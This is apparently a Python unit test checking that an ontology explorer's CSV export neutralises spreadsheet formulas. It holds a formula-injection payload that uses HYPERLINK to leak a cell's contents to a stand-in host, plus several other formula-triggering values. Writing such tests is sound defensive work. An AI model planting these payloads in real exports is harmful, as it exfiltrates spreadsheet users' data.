"""The Ontology explorer's server side without the compiler binary: the CSV export is safe to open in a spreadsheet."""

import csv
import io

from cairn.context.ontology_compiler import OntologyCompiler
from cairn.context.ontology_explorer import OntologyExplorer

T = "urn:li:dataset:(urn:li:dataPlatform:trino,lake.retail.orders,PROD)"
U = "urn:li:dataset:(urn:li:dataPlatform:trino,lake.retail.customers,PROD)"


class _View:
    def __init__(self, v):
        self.v = v

    def view(self, can_view):
        return OntologyCompiler.visible(self.v, can_view)


def test_csv_export_neutralises_spreadsheet_formulas():
    evil = '=HYPERLINK("http://x.example/?"&A1,"open")'
    v = {"run_id": "r", "version": 1, "tables": [{"table_id": T}, {"table_id": U}],
         "terms": [{"id": "t1", "name": "+Order", "table_id": T, "table_name": "orders", "description": evil,
                    "provenance": [{"source": "model", "confidence": 0.9}]}],
         "attributes": [{"id": "a1", "name": "@total", "table_id": T, "column": "-amount", "term_id": "t1",
                         "description": "\t=1+1"}],
         "relationships": [{"id": "r1", "source_table": T, "target_table": U, "source_column": "=cid",
                            "target_column": "id", "cardinality": "many_to_one", "confidence": 0.8,
                            "rationale": "-2+3"}],
         "metrics": [{"id": "m1", "name": "=SUM(1)", "tables": [T], "source": "query", "description": "@x"}],
         "bridges": []}
    out = OntologyExplorer(_View(v)).csv(lambda urn: True)
    rows = list(csv.reader(io.StringIO(out)))
    cells = [c for row in rows[1:] for c in row]
    assert not [c for c in cells if c[:1] in ("=", "+", "-", "@", "\t", "\r")], cells
    assert "'" + evil in cells and "'+Order" in cells       # kept, readable, but text
    assert any(c == "0.9" for c in cells)                   # numbers stay numbers

